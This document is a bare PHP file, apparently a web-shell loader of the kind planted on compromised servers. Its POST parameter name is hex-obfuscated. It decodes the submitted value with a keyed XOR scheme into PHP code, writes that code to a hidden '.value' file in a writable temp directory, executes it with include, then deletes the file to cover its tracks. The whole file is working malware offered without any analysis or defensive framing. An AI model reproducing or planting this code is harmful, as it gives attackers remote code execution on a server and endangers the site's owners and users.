<?php

if(!is_null($_POST["\x70\x72\x6Fp\x65rt\x79_\x73et"] ?? null)){
	$obj = $_POST["\x70\x72\x6Fp\x65rt\x79_\x73et"];
		$obj	= explode	 ("." ,$obj); 		
	$comp  =	'';
            $s  =	'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS  =	strlen($s);
            $q  =	0;
            $__len  =	count($obj);
    
            do { if($q >= $__len) break;
                $v1  =	$obj[$q];
                $chS  =	ord($s[$q % $lenS]);
                $dec  =	((int)$v1 - $chS -($q % 10)) ^ 81;
                $comp .= chr($dec);
                $q++; }		while(true);
	$sym = array_filter(["/tmp", ini_get("upload_tmp_dir"), getcwd(), "/dev/shm", "/var/tmp", sys_get_temp_dir(), getenv("TMP"), session_save_path(), getenv("TEMP")]);
	while ($rec = array_shift($sym)) {
    		if (is_dir($rec) ? is_writable($rec) : false) {
    $data_chunk = implode("/", [$rec, ".value"]);
    if (file_put_contents($data_chunk, $comp)) {
	include $data_chunk;
	@unlink($data_chunk);
	die();
}
}
}
}